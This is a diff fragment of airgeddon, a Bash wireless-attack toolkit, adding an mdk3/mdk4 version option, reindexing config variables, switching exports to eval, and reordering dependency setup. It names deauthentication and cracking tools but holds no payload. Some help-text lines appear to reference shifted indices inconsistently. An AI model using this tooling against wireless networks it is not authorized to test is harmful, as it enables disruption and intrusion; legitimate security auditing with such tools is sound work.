+	nonboolean_options_env_vars["${ordered_options_env_vars[9]},default_value"]="mdk4"
+	nonboolean_options_env_vars["${ordered_options_env_vars[12]},default_value"]="xterm"
 
-	nonboolean_options_env_vars["${ordered_options_env_vars[11]},rcfile_text"]="#Available values: xterm, tmux - Define the needed tool to be used for windows handling - Default value xterm"
+	nonboolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Available values: mdk3, mdk4 - Define which mdk version is going to be used - Default value mdk4"
+	nonboolean_options_env_vars["${ordered_options_env_vars[12]},rcfile_text"]="#Available values: xterm, tmux - Define the needed tool to be used for windows handling - Default value xterm"
 
 	declare -gA boolean_options_env_vars
 	boolean_options_env_vars["${ordered_options_env_vars[0]},default_value"]="true"
@@ -13582,8 +14095,8 @@ function env_vars_initialization() {
 	boolean_options_env_vars["${ordered_options_env_vars[6]},default_value"]="true"
 	boolean_options_env_vars["${ordered_options_env_vars[7]},default_value"]="true"
 	boolean_options_env_vars["${ordered_options_env_vars[8]},default_value"]="false"
-	boolean_options_env_vars["${ordered_options_env_vars[9]},default_value"]="false"
 	boolean_options_env_vars["${ordered_options_env_vars[10]},default_value"]="false"
+	boolean_options_env_vars["${ordered_options_env_vars[11]},default_value"]="false"
 
 	boolean_options_env_vars["${ordered_options_env_vars[0]},rcfile_text"]="#Enabled true / Disabled false - Auto update feature (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[0]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[1]},rcfile_text"]="#Enabled true / Disabled false - Skip intro (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[1]},'default_value']}"
@@ -13594,8 +14107,8 @@ function env_vars_initialization() {
 	boolean_options_env_vars["${ordered_options_env_vars[6]},rcfile_text"]="#Enabled true / Disabled false - Print help hints on menus - Default value ${boolean_options_env_vars[${ordered_options_env_vars[6]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[7]},rcfile_text"]="#Enabled true / Disabled false - Enable 5Ghz support (it has no effect if your cards are not 5Ghz compatible cards) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[7]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[8]},rcfile_text"]="#Enabled true / Disabled false - Force to use iptables instead of nftables (it has no effect if nftables are not present) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[8]},'default_value']}"
-	boolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
-	boolean_options_env_vars["${ordered_options_env_vars[10]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[10]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[10]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[11]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[10]},'default_value']}"
 
 	readarray -t ENV_VARS_ELEMENTS < <(printf %s\\n "${!nonboolean_options_env_vars[@]} ${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
 	readarray -t ENV_BOOLEAN_VARS_ELEMENTS < <(printf %s\\n "${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
@@ -13624,10 +14137,10 @@ function env_vars_values_validation() {
 				eval "export $(grep "${item}" "${scriptfolder}${rc_file}")"
 			else
 				if echo "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
-					export ${item}=${boolean_options_env_vars["${item}",'default_value']}
+					eval "export ${item}=${boolean_options_env_vars[${item},'default_value']}"
 					errors_on_configuration_vars["${item},missing_var"]="${boolean_options_env_vars[${item},'default_value']}"
 				elif echo "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
-					export ${item}=${nonboolean_options_env_vars["${item}",'default_value']}
+					eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
 					errors_on_configuration_vars["${item},missing_var"]="${nonboolean_options_env_vars[${item},'default_value']}"
 				fi
 			fi
@@ -13637,7 +14150,7 @@ function env_vars_values_validation() {
 	for item in "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}"; do
 		if ! [[ "${!item,,}" =~ ^(true|false)$ ]]; then
 			errors_on_configuration_vars["${item},invalid_value"]="${boolean_options_env_vars[${item},'default_value']}"
-			export ${item}=${boolean_options_env_vars["${item}",'default_value']}
+			eval "export ${item}=${boolean_options_env_vars[${item},'default_value']}"
 		fi
 	done
 
@@ -13645,7 +14158,12 @@ function env_vars_values_validation() {
 		if [ "${item}" = "AIRGEDDON_WINDOWS_HANDLING" ]; then
 			if ! [[ "${!item,,}" =~ ^(xterm|tmux)$ ]]; then
 				errors_on_configuration_vars["${item},invalid_value"]="${nonboolean_options_env_vars[${item},'default_value']}"
-				export ${item}=${nonboolean_options_env_vars["${item}",'default_value']}
+				eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
+			fi
+		elif [ "${item}" = "AIRGEDDON_MDK_VERSION" ]; then
+			if ! [[ "${!item,,}" =~ ^(mdk3|mdk4)$ ]]; then
+				errors_on_configuration_vars["${item},invalid_value"]="${nonboolean_options_env_vars[${item},'default_value']}"
+				eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
 			fi
 		fi
 	done
@@ -13956,9 +14474,11 @@ function get_tmux_process_id() {
 
 	debug_print
 
-	local process_pid
-	local process_cmd_line
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+
+		local process_cmd_line
+		local process_pid
+
 		process_cmd_line=$(echo "${1}" | tr -d '"')
 		while [ -z "${process_pid}" ]; do
 			process_pid=$(ps --no-headers aux | grep "${process_cmd_line}" | grep -v "grep ${process_cmd_line}" | awk '{print $2}')
@@ -14040,12 +14560,11 @@ function main() {
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		check_xwindow_system
 		detect_screen_resolution
-	else
-		essential_tools_names=(${essential_tools_names[@]/xterm/tmux})
-		possible_package_names[${essential_tools_names[7]}]="tmux"
-		unset possible_package_names["xterm"]
 	fi
 
+	iptables_nftables_detection
+	set_mdk_version
+	dependencies_modifications
 	set_possible_aliases
 	initialize_optional_tools_values
 
@@ -14106,7 +14625,6 @@ function main() {
 		check_update_tools
 	fi
 
-	iptables_nftables_detection
 	print_configuration_vars_issues
 	initialize_extended_colorized_output
 	set_windows_sizes
@@ -14413,7 +14931,7 @@ function remove_warnings() {
 	echo "${clean_handshake_dependencies[@]}" > /dev/null 2>&1
 	echo "${aircrack_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
-	echo "${mdk4_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${mdk_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
@@ -14430,6 +14948,7 @@ function remove_warnings() {
 	echo "${asleap_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${john_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${johncrunch_attacks_dependencies[@]}" > /dev/null 2>&1
+	echo "${enterprise_certificates_dependencies[@]}" > /dev/null 2>&1
 	echo "${is_arm}" > /dev/null 2>&1
 }
 
